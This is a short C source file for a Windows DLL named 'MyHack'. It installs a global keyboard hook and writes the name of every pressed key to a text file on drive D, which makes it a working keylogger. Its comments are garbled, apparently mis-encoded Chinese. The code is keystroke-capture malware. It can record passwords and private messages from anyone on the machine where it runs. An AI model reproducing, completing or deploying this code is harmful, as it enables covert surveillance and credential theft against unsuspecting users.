#include "MyHack.h"





int InstallHook()
{
	g_hook =  SetWindowsHookEx(WH_KEYBOARD, KeyboardProc,GetModuleHandle(L"MyHack"), 0); //3���� ģ�� һ��exe��dll���Խ���һ��ģ�� 
	if (g_hook == NULL)
		return 0;


	return 1;
}

int UnInstallHook()
{
	return UnhookWindowsHookEx(g_hook);//����0 ʧ�� ����1 �ɹ�
	//return 1;
}

//���̹��Ӵ�����
long CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	

	
	
	 FILE* fp = fopen("D:\\keyboard_record.txt", "a");
	 if(nCode < 0 || nCode == HC_NOREMOVE )
		return CallNextHookEx(g_hook, nCode, wParam, lParam);
	//lPatam ��һ��32λ����  30λ��1�����ѱ����� 
	if(lParam & 0x40000000)
		return CallNextHookEx(g_hook, nCode, wParam, lParam);
	char key[100];

	GetKeyNameTextA(lParam,key,sizeof(key));
	fwrite(key, 1, strlen(key),fp);


	fclose(fp);

	return CallNextHookEx(g_hook, nCode, wParam, lParam);
	
	

}